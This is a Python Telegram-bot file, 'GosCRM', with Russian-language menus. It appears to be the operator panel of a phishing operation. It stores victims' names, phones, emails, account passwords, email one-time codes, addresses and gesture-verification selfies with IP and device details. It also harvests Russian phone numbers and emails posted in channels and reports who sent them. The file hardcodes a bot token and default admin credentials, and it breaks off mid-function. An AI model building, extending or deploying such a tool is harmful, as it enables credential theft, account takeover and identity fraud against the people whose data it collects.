import json
import os
import re
import base64
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BotCommand,
)

# Чтение токена из переменных окружения (или укажите прямо здесь вместо дефолтного)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8665913172:AAFN7RA8q46hpgnSeO0btyhocqyNtGgoYFA")
bot = telebot.TeleBot(BOT_TOKEN)

BOT_TITLE = "🛡️ GosCRM | Панель управления"

# Базовые данные для входа через Telegram (/login admin merlnv)
DEFAULT_ACCOUNTS = {
    "admin": "merlnv",
}

AUTH_FILE = "authorized_chats.json"
CLIENTS_FILE = "clients_db.json"
ADMIN_CONFIG_FILE = "admin_config.json"
CAPTURES_FILE = "channel_captures.json"
PHOTOS_DIR = "photos"

os.makedirs(PHOTOS_DIR, exist_ok=True)


def setup_bot_commands():
    try:
        commands = [
            BotCommand("start", "🏠 Главное меню"),
            BotCommand("recent", "📋 Недавние запросы и данные из канала"),
            BotCommand("clients", "🔍 Поиск и добавление клиента"),
            BotCommand("report", "📊 Отчёт за день по номерам и почтам"),
            BotCommand("admin", "👑 Панель администратора"),
            BotCommand("bind_channel", "🔗 Привязать текущий канал или группу"),
        ]
        bot.set_my_commands(commands)
    except Exception as e:
        print(f"Ошибка установки меню команд: {e}")


def today_str():
    return datetime.now().strftime("%d.%m.%Y")


def load_authorized_chats():
    if os.path.exists(AUTH_FILE):
        try:
            with open(AUTH_FILE, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception:
            return set()
    return set()


def save_authorized_chats(chats):
    with open(AUTH_FILE, "w", encoding="utf-8") as f:
        json.dump(list(chats), f, ensure_ascii=False, indent=2)


def load_clients():
    if os.path.exists(CLIENTS_FILE):
        try:
            with open(CLIENTS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []


def save_clients(clients):
    with open(CLIENTS_FILE, "w", encoding="utf-8") as f:
        json.dump(clients, f, ensure_ascii=False, indent=2)


def load_admin_config():
    default_cfg = {
        "accounts": DEFAULT_ACCOUNTS.copy(),
        "managers": [],       # [{"id": "123456", "name": "Иван", "addedAt": "..."}]
        "groups": [],         # [{"id": "-100...", "title": "Канал 1"}]
        "reg_channel": None,  # ID или @username канала/группы для регистрации и отчётов
    }
    if os.path.exists(ADMIN_CONFIG_FILE):
        try:
            with open(ADMIN_CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for k, v in default_cfg.items():
                    if k not in data:
                        data[k] = v
                return data
        except Exception:
            return default_cfg
    return default_cfg


def save_admin_config(cfg):
    with open(ADMIN_CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)


def load_captures():
    if os.path.exists(CAPTURES_FILE):
        try:
            with open(CAPTURES_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                current_day = today_str()
                return [item for item in data if item.get("date") == current_day]
        except Exception:
            return []
    return []


def save_captures(captures):
    current_day = today_str()
    filtered = [item for item in captures if item.get("date") == current_day]
    with open(CAPTURES_FILE, "w", encoding="utf-8") as f:
        json.dump(filtered, f, ensure_ascii=False, indent=2)


authorized_chats = load_authorized_chats()
clients_db = load_clients()
admin_config = load_admin_config()
channel_captures = load_captures()

# Состояния пользователей для пошагового ввода: {chat_id: {"action": ..., ...}}
admin_states = {}


def cleanup_captures():
    global channel_captures
    current_day = today_str()
    before_len = len(channel_captures)
    channel_captures = [c for c in channel_captures if c.get("date") == current_day]
    if len(channel_captures) != before_len:
        save_captures(channel_captures)


def get_next_capture_id():
    cleanup_captures()
    if not channel_captures:
        return 1
    return max(c.get("id", 0) for c in channel_captures) + 1


def get_capture_by_id(cap_id):
    cleanup_captures()
    for c in channel_captures:
        if c.get("id") == cap_id:
            return c
    return None


def extract_phones(text):
    if not text:
        return []
    pattern = r'(?:\+7|8|\b7)[\s\-]?\(?[489]\d{2}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}'
    matches = re.findall(pattern, text)
    cleaned = []
    for m in matches:
        digits = re.sub(r'\D', '', m)
        if len(digits) == 11 and digits[0] in ('7', '8'):
            norm = '+7' + digits[1:]
            if norm not in cleaned:
                cleaned.append(norm)
    return cleaned


def extract_emails(text):
    if not text:
        return []
    pattern = r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'
    matches = re.findall(pattern, text)
    cleaned = []
    for m in matches:
        m_clean = m.strip().rstrip('.,;:')
        if m_clean not in cleaned:
            cleaned.append(m_clean)
    return cleaned


def get_sender_display(message):
    if getattr(message, 'forward_from', None):
        u = message.forward_from
        name = " ".join(filter(None, [u.first_name, u.last_name]))
        uname = f" (@{u.username})" if u.username else ""
        return f"{name}{uname} [ID: {u.id}]"
    if getattr(message, 'forward_sender_name', None):
        return message.forward_sender_name
    if getattr(message, 'from_user', None):
        u = message.from_user
        name = " ".join(filter(None, [u.first_name, u.last_name]))
        uname = f" (@{u.username})" if u.username else ""
        return f"{name}{uname} [ID: {u.id}]"
    if getattr(message, 'author_signature', None):
        return message.author_signature
    if getattr(message, 'sender_chat', None):
        sc = message.sender_chat
        uname = f" (@{sc.username})" if sc.username else ""
        return f"{sc.title}{uname}"
    return "Участник канала"


def process_channel_or_group_message(message):
    text = (message.text or message.caption or "").strip()
    if not text:
        return False

    phones = extract_phones(text)
    emails = extract_emails(text)

    if not phones and not emails:
        return False

    cleanup_captures()
    chat_id_str = str(message.chat.id)
    chat_title = message.chat.title or message.chat.username or f"Chat {chat_id_str}"
    sender_name = get_sender_display(message)

    if not any(g.get("id") == chat_id_str for g in admin_config["groups"]):
        admin_config["groups"].append({"id": chat_id_str, "title": chat_title})
        if not admin_config.get("reg_channel"):
            admin_config["reg_channel"] = chat_id_str
        save_admin_config(admin_config)

    capture_entry = {
        "id": get_next_capture_id(),
        "date": today_str(),
        "time": datetime.now().strftime("%H:%M:%S"),
        "chat_id": chat_id_str,
        "chat_title": chat_title,
        "sender_name": sender_name,
        "phones": phones,
        "emails": emails,
    }
    channel_captures.append(capture_entry)
    save_captures(channel_captures)
    return True


def format_daily_report(chat_filter=None):
    cleanup_captures()
    current_day = today_str()
    records = [
        c for c in channel_captures
        if not chat_filter or str(c.get("chat_id")) == str(chat_filter)
    ]

    if not records:
        return f"📊 Отчёт за {current_day}\n\nЗа сегодня в каналах и группах ещё не скидывали номеров РФ или эл. почт."

    lines = [f"📊 Отчёт по собранным данным за день ({current_day}):\n"]
    total_phones = 0
    total_emails = 0

    for idx, rec in enumerate(records, start=1):
        sender = rec.get("sender_name", "Неизвестно")
        ch_title = rec.get("chat_title", "Канал")
        t_str = rec.get("time", "")
        phones = rec.get("phones", [])
        emails = rec.get("emails", [])
        total_phones += len(phones)
        total_emails += len(emails)

        parts = []
        if phones:
            parts.append("📞 " + ", ".join(phones))
        if emails:
            parts.append("📧 " + ", ".join(emails))
        data_str = " | ".join(parts)

        lines.append(
            f"{idx}. 👤 {sender}\n"
            f"   📢 Канал/Чат: {ch_title} ({t_str})\n"
            f"   📥 Данные: {data_str}"
        )

    lines.append(
        f"\n📈 Итого за сегодня: записей — {len(records)} "
        f"(номеров: {total_phones}, почт: {total_emails})"
    )
    return "\n".join(lines)


def is_authorized(chat_id):
    return chat_id in authorized_chats


def get_next_client_id():
    if not clients_db:
        return 1
    return max(c.get("id", 0) for c in clients_db) + 1


def get_client_by_id(client_id):
    for client in clients_db:
        if client.get("id") == client_id:
            return client
    return None


# Нижняя панель из 4 кнопок с подходящими названиями и эмодзи
def main_menu_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=4)
    markup.row(
        KeyboardButton("📋 Недавние"),
        KeyboardButton("🔍 Клиенты"),
        KeyboardButton("📊 Отчёт"),
        KeyboardButton("👑 Админ"),
    )
    return markup


def cancel_keyboard(with_skip=False):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True, row_width=2)
    if with_skip:
        markup.add(KeyboardButton("⏭ Пропустить"), KeyboardButton("❌ Отмена"))
    else:
        markup.add(KeyboardButton("❌ Отмена"))
    return markup


def button_recent_inline_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📋 Недавние запросы (Анкеты и Фото)", callback_data="menu_recent_requests"),
        InlineKeyboardButton("📥 Недавние номера и почты из канала", callback_data="menu_recent_captures"),
    )
    return markup


def button_clients_inline_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔍 Поиск клиента по имени / телефону / почте", callback_data="menu_search_client"),
        InlineKeyboardButton("➕ Новый клиент (вписать ФИО, телефон, почту)", callback_data="menu_create_client"),
    )
    return markup


def admin_panel_inline_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("👨‍💼 Зарегистрировать менеджера (TG ID / Вручную)", callback_data="admin_add_manager"),
        InlineKeyboardButton("📋 Список менеджеров", callback_data="admin_list_managers"),
        InlineKeyboardButton("📢 Указать канал/группу регистрации", callback_data="admin_set_reg_channel"),
        InlineKeyboardButton("🔗 Добавить группу/канал для ассоциации", callback_data="admin_add_group"),
        InlineKeyboardButton("🗂 Список групп/каналов", callback_data="admin_list_groups"),
        InlineKeyboardButton("🔑 Добавить аккаунт входа (Почта/Логин и Пароль)", callback_data="admin_add_account"),
    )
    return markup


def client_inline_keyboard(client_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("✏️ ФИО", callback_data=f"edit_name:{client_id}"),
        InlineKeyboardButton("📞 Телефон", callback_data=f"edit_phone:{client_id}"),
        InlineKeyboardButton("📧 Эл. почта", callback_data=f"edit_email:{client_id}"),
        InlineKeyboardButton("🔑 Пароль", callback_data=f"edit_password:{client_id}"),
        InlineKeyboardButton("📢 Группа/Канал", callback_data=f"edit_group:{client_id}"),
        InlineKeyboardButton("👨‍💼 Менеджер", callback_data=f"edit_manager:{client_id}"),
        InlineKeyboardButton("⚙️ Характеристики", callback_data=f"edit_specs:{client_id}"),
        InlineKeyboardButton("💬 Комментарий", callback_data=f"edit_comment:{client_id}"),
    )
    markup.add(
        InlineKeyboardButton("⚡ Подставить недавние (Из канала)", callback_data=f"recent_cap:{client_id}"),
        InlineKeyboardButton("📤 Отправить карточку в канал", callback_data=f"send_to_channel:{client_id}"),
    )
    return markup


def build_recent_phones_inline(client_id):
    cleanup_captures()
    markup = InlineKeyboardMarkup(row_width=1)
    added = 0
    for cap in reversed(channel_captures):
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "")
        for idx, ph in enumerate(cap.get("phones", [])):
            markup.add(InlineKeyboardButton(
                f"📞 {ph} — от {sender} ({cap.get('time')})",
                callback_data=f"use_ph:{client_id}:{cap_id}:{idx}"
            ))
            added += 1
            if added >= 10:
                break
        if added >= 10:
            break
    return markup if added > 0 else None


def build_recent_emails_inline(client_id):
    cleanup_captures()
    markup = InlineKeyboardMarkup(row_width=1)
    added = 0
    for cap in reversed(channel_captures):
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "")
        for idx, em in enumerate(cap.get("emails", [])):
            markup.add(InlineKeyboardButton(
                f"📧 {em} — от {sender} ({cap.get('time')})",
                callback_data=f"use_em:{client_id}:{cap_id}:{idx}"
            ))
            added += 1
            if added >= 10:
                break
        if added >= 10:
            break
    return markup if added > 0 else None


def build_recent_combined_inline(client_id):
    cleanup_captures()
    markup = InlineKeyboardMarkup(row_width=1)
    added = 0
    for cap in reversed(channel_captures):
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "")
        t_str = cap.get("time", "")
        phones = cap.get("phones", [])
        emails = cap.get("emails", [])

        if phones and emails:
            markup.add(InlineKeyboardButton(
                f"⚡ {phones[0]} + {emails[0]} ({sender}, {t_str})",
                callback_data=f"use_both:{client_id}:{cap_id}"
            ))
            added += 1

        for idx, ph in enumerate(phones):
            markup.add(InlineKeyboardButton(
                f"📞 {ph} ({sender}, {t_str})",
                callback_data=f"use_ph:{client_id}:{cap_id}:{idx}"
            ))
            added += 1

        for idx, em in enumerate(emails):
            markup.add(InlineKeyboardButton(
                f"📧 {em} ({sender}, {t_str})",
                callback_data=f"use_em:{client_id}:{cap_id}:{idx}"
            ))
            added += 1

        if added >= 12:
            break
    return markup if added > 0 else None


def format_client_card(client):
    c_id = client.get("id")
    c_type = client.get("type", "manual")
    full_name = client.get("fullName") or "Не указано"
    phone = client.get("phone") or "Не указан"
    email = client.get("email") or "Не указана"
    password = client.get("password") or "Не указан"
    group_assoc = client.get("group") or "Не привязана"
    manager = client.get("manager") or "Не назначен"
    specs = client.get("specs") or "Нет"
    comment = client.get("comment") or "Нет"
    created_at = client.get("createdAt", "Н/Д")

    if c_type == "lead":
        header = f"🔔 Заявка на регистрацию #{c_id}"
        details = (
            f"👤 ФИО: {full_name}\n"
            f"📞 Телефон: {phone}\n"
            f"📧 Эл. почта: {email}\n"
            f"🔑 Пароль: {password}\n"
            f"🏠 Адрес: {client.get('address', 'Н/Д')}\n"
            f"🔢 Код E-mail: {client.get('otpCode', 'Не введен')}\n"
            f"🕒 Создано: {created_at}\n"
        )
    elif c_type == "biometry":
        header = f"📸 Фото верификации (Жест) #{c_id}"
        details = (
            f"👤 ФИО: {full_name}\n"
            f"📞 Телефон: {phone}\n"
            f"📧 Эл. почта: {email}\n"
            f"🔑 Пароль: {password}\n"
            f"🌐 IP-адрес: {client.get('ip', 'Н/Д')}\n"
            f"⏱ Время клиента: {client.get('localTime', 'Н/Д')}\n"
            f"📱 Платформа: {client.get('platform', 'Н/Д')}\n"
            f"🖥 Экран: {client.get('screenRes', 'Н/Д')}\n"
            f"🗣 Язык ОС: {client.get('language', 'Н/Д')}\n"
            f"🔍 User-Agent:\n{client.get('userAgent', 'Н/Д')}\n"
        )
    else:
        header = f"🗂 Карточка клиента #{c_id}"
        details = (
            f"👤 ФИО: {full_name}\n"
            f"📞 Телефон: {phone}\n"
            f"📧 Эл. почта: {email}\n"
            f"🔑 Пароль: {password}\n"
            f"🕒 Создано: {created_at}\n"
        )

    extra = (
        f"\n📢 Группа / Канал: {group_assoc}\n"
        f"👨‍💼 Менеджер: {manager}\n"
        f"⚙️ Доп. характеристики: {specs}\n"
        f"💬 Комментарий: {comment}"
    )
    return f"{header}\n\n{details}{extra}"


def send_client_card(chat_id, client, with_markup=True):
    text = format_client_card(client)
    markup = client_inline_keyboard(client["id"]) if with_markup else None
    photo_path = client.get("photoPath")

    if photo_path and os.path.exists(photo_path):
        try:
            with open(photo_path, "rb") as photo_file:
                bot.send_photo(chat_id, photo_file, caption=text, reply_markup=markup)
                return
        except Exception as e:
            print(f"Ошибка отправки фото клиенту {chat_id}: {e}")

    bot.send_message(chat_id, text, reply_markup=markup)


def format_admin_summary():
    cleanup_captures()
    reg_ch = admin_config.get("reg_channel") or "Не задан"
    managers_count = len(admin_config.get("managers", []))
    groups_count = len(admin_config.get("groups", []))
    accounts_count = len(admin_config.get("accounts", {}))
    captures_count = len(channel_captures)
    return (
        f"👑 {BOT_TITLE} — Администрирование\n\n"
        f"📢 Канал/группа регистрации: {reg_ch}\n"
        f"👨‍💼 Зарегистрировано менеджеров: {managers_count}\n"
        f"🔗 Групп/каналов для ассоциации: {groups_count}\n"
        f"🔑 Аккаунтов для входа: {accounts_count}\n"
        f"📥 Захвачено номеров/почт за сегодня: {captures_count}\n\n"
        "💡 Добавьте бота в нужный канал или группу и напишите там "
        "/bind_channel (для привязки) или /report (для вывода отчёта за день)."
    )


def show_recent_requests(chat_id):
    if not clients_db:
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("📥 Открыть недавние номера/почты из канала", callback_data="menu_recent_captures"))
        bot.send_message(
            chat_id,
            "📭 Список заявок пока пуст.",
            reply_markup=markup
        )
        return

    recent = clients_db[-10:][::-1]
    markup = InlineKeyboardMarkup(row_width=1)
    for c in recent:
        icon = "📸" if c.get("type") == "biometry" else ("🔔" if c.get("type") == "lead" else "🗂")
        name_disp = c.get("fullName") or c.get("ip") or "Без имени"
        phone_disp = c.get("phone") or ""
        time_disp = c.get("createdAt") or c.get("localTime") or ""
        extra_info = f" | {phone_disp}" if phone_disp and phone_disp != "Не указан" else ""
        btn_text = f"{icon} #{c['id']} | {name_disp}{extra_info} ({time_disp})"
        markup.add(InlineKeyboardButton(btn_text, callback_data=f"view_client:{c['id']}"))

    markup.add(InlineKeyboardButton("📥 Открыть недавние номера/почты из канала", callback_data="menu_recent_captures"))
    bot.send_message(
        chat_id,
        "📋 Последние 10 запросов (нажмите на клиента для просмотра и редактирования):",
        reply_markup=markup
    )


def show_recent_captures(chat_id):
    cleanup_captures()
    if not channel_captures:
        bot.send_message(
            chat_id,
            "📭 За сегодня в каналах/группах ещё не было сообщений с номерами РФ или эл. почтой.",
            reply_markup=main_menu_keyboard()
        )
        return

    markup = InlineKeyboardMarkup(row_width=1)
    for cap in channel_captures[-12:][::-1]:
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "Неизвестно")
        t_str = cap.get("time", "")
        items = cap.get("phones", []) + cap.get("emails", [])
        summary = ", ".join(items)
        markup.add(InlineKeyboardButton(
            f"➕ Создать карточку: {summary} ({sender}, {t_str})",
            callback_data=f"create_from_cap:{cap_id}"
        ))

    bot.send_message(
        chat_id,
        "📥 Недавние номера и почты из канала за сегодня.\n"
        "Нажмите на запись, чтобы сразу создать карточку клиента с этими данными, "
        "либо откройте любого клиента и нажмите «⚡ Подставить недавние (Из канала)»:",
        reply_markup=markup
    )


def show_daily_report_panel(chat_id):
    report_text = format_daily_report()
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📤 Опубликовать отчёт в канал", callback_data="publish_report_channel"),
        InlineKeyboardButton("📥 Недавние номера и почты из канала", callback_data="menu_recent_captures"),
        InlineKeyboardButton("🗑 Очистить данные за сегодня", callback_data="clear_today_captures"),
    )
    bot.send_message(chat_id, report_text, reply_markup=markup)


# --- ПЕРЕХВАТ ПОСТОВ В КАНАЛАХ ---
@bot.channel_post_handler(content_types=['text', 'photo', 'video', 'document'])
def handle_channel_posts(message):
    text = (message.text or message.caption or "").strip()
    if text.startswith("/bind_channel"):
        handle_bind_channel(message)
        return
    if text.startswith("/report"):
        report_text = format_daily_report(chat_filter=message.chat.id)
        bot.send_message(message.chat.id, report_text)
        return
    process_channel_or_group_message(message)


# Команда для быстрой привязки группы или канала прямо из чата
@bot.message_handler(commands=['bind_channel'])
def handle_bind_channel(message):
    chat_id_str = str(message.chat.id)
    chat_title = message.chat.title or message.chat.username or f"Chat {chat_id_str}"

    admin_config["reg_channel"] = chat_id_str
    exists = any(g.get("id") == chat_id_str for g in admin_config["groups"])
    if not exists:
        admin_config["groups"].append({"id": chat_id_str, "title": chat_title})
    save_admin_config(admin_config)

    bot.reply_to(
        message,
        f"✅ Чат «{chat_title}» (ID: `{chat_id_str}`) успешно привязан как канал регистрации и отслеживания номеров/почт!",
        parse_mode="Markdown"
    )


# Команды из кнопки «Меню»
@bot.message_handler(commands=['recent'])
def handle_recent_command(message):
    if is_authorized(message.chat.id):
        bot.send_message(
            message.chat.id,
            "📋 Выберите раздел недавних данных:",
            reply_markup=button_recent_inline_menu()
        )


@bot.message_handler(commands=['clients'])
def handle_clients_command(message):
    if is_authorized(message.chat.id):
        bot.send_message(
            message.chat.id,
            "🔍 Поиск и добавление клиентов:",
            reply_markup=button_clients_inline_menu()
        )


@bot.message_handler(commands=['report'])
def handle_report_command(message):
    if message.chat.type in ('group', 'supergroup', 'channel'):
        report_text = format_daily_report(chat_filter=message.chat.id)
        bot.reply_to(message, report_text)
    elif is_authorized(message.chat.id):
        show_daily_report_panel(message.chat.id)


@bot.message_handler(commands=['admin'])
def handle_admin_command(message):
    if is_authorized(message.chat.id):
        bot.send_message(
            message.chat.id,
            format_admin_summary(),
            reply_markup=admin_panel_inline_keyboard()
        )


# Ответ на /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.type in ('group', 'supergroup'):
        return
    if is_authorized(message.chat.id):
        bot.send_message(
            message.chat.id,
            f"*{BOT_TITLE}*\n\n"
            "Нижняя панель навигации:\n"
            "• *📋 Недавние* — Недавние заявки, фото и захваты из канала\n"
            "• *🔍 Клиенты* — Поиск по имени и добавление нового клиента\n"
            "• *📊 Отчёт* — Отчёт за день (кто скинул номер РФ / почту)\n"
            "• *👑 Админ* — Панель администратора (менеджеры, каналы, доступы)",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    else:
        bot.reply_to(
            message,
            f"*{BOT_TITLE}*\n\n"
            "Для получения уведомлений и доступа к панели введите логин (или почту) и пароль:\n"
            "`/login логин пароль`",
            parse_mode="Markdown"
        )


# Авторизация /login
@bot.message_handler(commands=['login'])
def handle_login(message):
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Использование: `/login почта_или_логин пароль`", parse_mode="Markdown")
            return

        login_input, pass_input = parts[1].strip(), parts[2].strip()
        accounts = admin_config.get("accounts", DEFAULT_ACCOUNTS)

        if accounts.get(login_input) == pass_input:
            authorized_chats.add(message.chat.id)
            save_authorized_chats(authorized_chats)
            bot.send_message(
                message.chat.id,
                f"✅ *{BOT_TITLE}*\n"
                "Авторизация успешна! Вы будете получать новые заявки и фото.\n\n"
                "Используйте кнопки внизу (`📋 Недавние`, `🔍 Клиенты`, `📊 Отчёт`, `👑 Админ`) или кнопку «Меню».",
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
        else:
            bot.reply_to(message, "❌ Ошибка: неверный логин/почта или пароль.")
    except Exception:
        bot.reply_to(message, "Произошла ошибка при обработке команды.")


# Обработка инлайн-кнопок
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    if not is_authorized(chat_id):
        bot.answer_callback_query(call.id, "Нет доступа. Авторизуйтесь через /login", show_alert=True)
        return

    data = call.data

    # --- ПОДМЕНЮ КНОПОК НАВИГАЦИИ ---
    if data == "menu_recent_requests":
        bot.answer_callback_query(call.id)
        show_recent_requests(chat_id)
        return

    elif data == "menu_recent_captures":
        bot.answer_callback_query(call.id)
        show_recent_captures(chat_id)
        return

    elif data == "menu_search_client":
        admin_states[chat_id] = {"action": "search_name"}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "🔍 Введите ФИО, телефон, эл. почту, группу/канал, менеджера или IP для поиска клиента:",
            reply_markup=cancel_keyboard()
        )
        return

    elif data == "menu_create_client":
        admin_states[chat_id] = {"action": "create_step_name", "draft": {}}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "👤 Шаг 1/5: Введите ФИО нового клиента:",
            reply_markup=cancel_keyboard()
        )
        return

    # --- ОТЧЁТ И НЕДАВНИЕ ЗАХВАТЫ ИЗ КАНАЛА ---
    if data == "publish_report_channel":
        target_channel = admin_config.get("reg_channel")
        if not target_channel:
            bot.answer_callback_query(
                call.id,
                "Канал не привязан! Укажите канал в меню «👑 Админ» или командой /bind_channel.",
                show_alert=True
            )
            return
        try:
            report_text = format_daily_report()
            bot.send_message(target_channel, report_text)
            bot.answer_callback_query(call.id, "✅ Отчёт отправлен в канал!")
        except Exception as e:
            bot.answer_callback_query(call.id, f"Ошибка отправки: {e}", show_alert=True)
        return

    elif data == "clear_today_captures":
        channel_captures.clear()
        save_captures(channel_captures)
        bot.answer_callback_query(call.id, "Данные за сегодня очищены.")
        bot.send_message(chat_id, "🗑 Собранные за сегодня номера и почты из каналов очищены.")
        return

    elif data.startswith("create_from_cap:"):
        cap_id = int(data.split(":")[1])
        cap = get_capture_by_id(cap_id)
        if not cap:
            bot.answer_callback_query(call.id, "Запись не найдена.", show_alert=True)
            return

        phones = cap.get("phones", [])
        emails = cap.get("emails", [])
        new_client = {
            "id": get_next_client_id(),
            "type": "manual",
            "fullName": "Не указано",
            "phone": phones[0] if phones else "Не указан",
            "email": emails[0] if emails else "Не указана",
            "password": "Не указан",
            "group": f"{cap.get('chat_title')} ({cap.get('chat_id')})",
            "manager": cap.get("sender_name", "Не назначен"),
            "specs": "Нет",
            "comment": f"Создано из сообщения в канале ({cap.get('time')})",
            "createdAt": datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
        }
        clients_db.append(new_client)
        save_clients(clients_db)
        bot.answer_callback_query(call.id, f"Клиент #{new_client['id']} создан!")
        send_client_card(chat_id, new_client)
        return

    # --- ПОДСТАНОВКА НЕДАВНИХ НОМЕРОВ И ПОЧТ В КАРТОЧКУ КЛИЕНТА ---
    elif data.startswith("recent_cap:"):
        client_id = int(data.split(":")[1])
        client = get_client_by_id(client_id)
        if not client:
            bot.answer_callback_query(call.id, "Клиент не найден.", show_alert=True)
            return

        markup = build_recent_combined_inline(client_id)
        if not markup:
            bot.answer_callback_query(
                call.id,
                "За сегодня в канале ещё не скидывали номеров или почт.",
                show_alert=True
            )
            return

        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            f"⚡ Выберите недавние данные из канала для подстановки клиенту #{client_id}:",
            reply_markup=markup
        )
        return

    elif data.startswith("use_ph:"):
        _, c_id_str, cap_id_str, idx_str = data.split(":")
        client_id, cap_id, idx = int(c_id_str), int(cap_id_str), int(idx_str)
        client = get_client_by_id(client_id)
        cap = get_capture_by_id(cap_id)
        if not client or not cap or idx >= len(cap.get("phones", [])):
            bot.answer_callback_query(call.id, "Данные не найдены.", show_alert=True)
            return

        chosen_phone = cap["phones"][idx]
        client["phone"] = chosen_phone
        if client.get("group") in (None, "", "Не привязана"):
            client["group"] = f"{cap.get('chat_title')} ({cap.get('chat_id')})"
        save_clients(clients_db)
        admin_states.pop(chat_id, None)
        bot.answer_callback_query(call.id, f"Телефон {chosen_phone} применён!")
        bot.send_message(
            chat_id,
            f"✅ Номер `{chosen_phone}` (от {cap.get('sender_name')}) привязан к клиенту #{client_id}.",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
        send_client_card(chat_id, client)
        return

    elif data.startswith("use_em:"):
        _, c_id_str, cap_id_str, idx_str = data.split(":")
        client_id, cap_id, idx = int(c_id_str), int(cap_id_str), int(idx_str)
        client = get_client_by_id(client_id)
        cap = get_capture_by_id(cap_id)
        if not client or not cap or idx >= len(cap.get("emails", [])):
            bot.answer_callback_query(call.id, "Данные не найдены.", show_alert=True)
            return

        chosen_email = cap["emails"][idx]
        client["email"] = chosen_email
        if client.get("group") in (None, "", "Не привязана"):
            client["group"] = f"{cap.get('chat_title')} ({cap.get('chat_id')})"
        save_clients(clients_db)
        admin_states.pop(chat_id, None)
        bot.answer_callback_query(call.id, f"Почта {chosen_email} применена!")
        bot.send_message(
            chat_id,
            f"✅ Эл. почта `{chosen_email}` (от {cap.get('sender_name')}) привязана к клиенту #{client_id}.",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
        send_client_card(chat_id, client)
        return

    elif data.startswith("use_both:"):
        _, c_id_str, cap_id_str = data.split(":")
        client_id, cap_id = int(c_id_str), int(cap_id_str)
        client = get_client_by_id(client_id)
        cap = get_capture_by_id(cap_id)
        if not client or not cap:
            bot.answer_callback_query(call.id, "Данные не найдены.", show_alert=True)
            return

        if cap.get("phones"):
            client["phone"] = cap["phones"][0]
        if cap.get("emails"):
            client["email"] = cap["emails"][0]
        if client.get("group") in (None, "", "Не привязана"):
            client["group"] = f"{cap.get('chat_title')} ({cap.get('chat_id')})"
        save_clients(clients_db)
        admin_states.pop(chat_id, None)
        bot.answer_callback_query(call.id, "Номер и почта применены!")
        bot.send_message(
            chat_id,
            f"✅ Данные от {cap.get('sender_name')} применены к клиенту #{client_id}.",
            reply_markup=main_menu_keyboard()
        )
        send_client_card(chat_id, client)
        return

    # --- ПОДСТАНОВКА ПРИ ПОШАГОВОМ СОЗДАНИИ КЛИЕНТА ---
    elif data.startswith("draft_ph:"):
        _, cap_id_str, idx_str = data.split(":")
        cap = get_capture_by_id(int(cap_id_str))
        state = admin_states.get(chat_id)
        if not state or state.get("action") != "create_step_phone" or not cap:
            bot.answer_callback_query(call.id, "Шаг уже завершён.")
            return
        idx = int(idx_str)
        chosen_phone = cap["phones"][idx]
        state["draft"]["phone"] = chosen_phone
        state["draft"]["group"] = f"{cap.get('chat_title')} ({cap.get('chat_id')})"
        state["action"] = "create_step_email"
        bot.answer_callback_query(call.id, f"Выбран номер {chosen_phone}")
        prompt_step_email(chat_id)
        return

    elif data.startswith("draft_em:"):
        _, cap_id_str, idx_str = data.split(":")
        cap = get_capture_by_id(int(cap_id_str))
        state = admin_states.get(chat_id)
        if not state or state.get("action") != "create_step_email" or not cap:
            bot.answer_callback_query(call.id, "Шаг уже завершён.")
            return
        idx = int(idx_str)
        chosen_email = cap["emails"][idx]
        state["draft"]["email"] = chosen_email
        if not state["draft"].get("group"):
            state["draft"]["group"] = f"{cap.get('chat_title')} ({cap.get('chat_id')})"
        state["action"] = "create_step_password"
        bot.answer_callback_query(call.id, f"Выбрана почта {chosen_email}")
        bot.send_message(
            chat_id,
            "🔑 Шаг 4/5: Введите пароль клиента (или нажмите «⏭ Пропустить»):",
            reply_markup=cancel_keyboard(with_skip=True)
        )
        return

    # --- АДМИН-ПАНЕЛЬ ---
    if data == "admin_add_manager":
        admin_states[chat_id] = {"action": "admin_add_manager"}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "👨‍💼 Введите Telegram ID менеджера и (по желанию) его имя через пробел, либо впишите данные менеджера вручную.\n\n"
            "Примеры:\n"
            "`123456789 Иван`\n"
            "`987654321`\n"
            "`@manager_alex (Алексей)`",
